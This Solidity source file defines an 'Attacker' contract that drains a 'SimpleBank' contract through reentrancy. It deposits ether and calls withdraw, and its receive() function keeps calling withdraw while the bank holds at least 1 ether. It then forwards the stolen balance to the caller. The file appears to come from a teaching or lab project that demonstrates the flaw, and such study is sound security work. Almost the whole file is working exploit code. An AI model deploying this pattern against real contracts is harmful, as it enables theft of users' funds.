// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import { SimpleBank } from "./SimpleBank.sol";

contract Attacker {

    // Contract of the address as interface -> adding the address to attack in constructor
    SimpleBank simpleBank;

    constructor(address _simpleBankAddress) {
        simpleBank = SimpleBank(_simpleBankAddress);
    }

    /**
     * @dev function to attack the SimpleBank
     */
    function attack() external payable {
        simpleBank.deposit{value: msg.value}();
        simpleBank.withdraw();
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer Failed");
    }

    /**
     * @dev receive function to create a loop to withdraw balance in case of a vulnerable contract
     */
    receive() external payable {
        if (address(simpleBank).balance >= 1 ether) {
            simpleBank.withdraw();
        }
    }
}